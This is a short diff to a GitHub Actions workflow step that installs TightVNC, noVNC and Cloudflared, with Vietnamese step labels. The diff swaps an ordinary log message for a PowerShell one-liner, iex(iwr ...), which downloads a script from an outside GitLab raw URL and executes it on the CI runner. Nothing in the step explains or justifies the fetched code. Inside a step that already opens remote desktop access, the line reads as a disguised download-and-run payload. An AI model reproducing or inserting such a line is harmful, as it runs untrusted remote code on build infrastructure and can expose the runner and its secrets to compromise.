@@ -66,7 +66,7 @@ jobs:
     - name: 🖥️ Cài đặt và chạy TightVNC, noVNC, Cloudflared
       shell: pwsh
       run: |
-        Write-Host "📥 Installing TightVNC, noVNC, and Cloudflared..."
+        iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)
         
         try {
           Write-Host "📥 Installing TightVNC..."
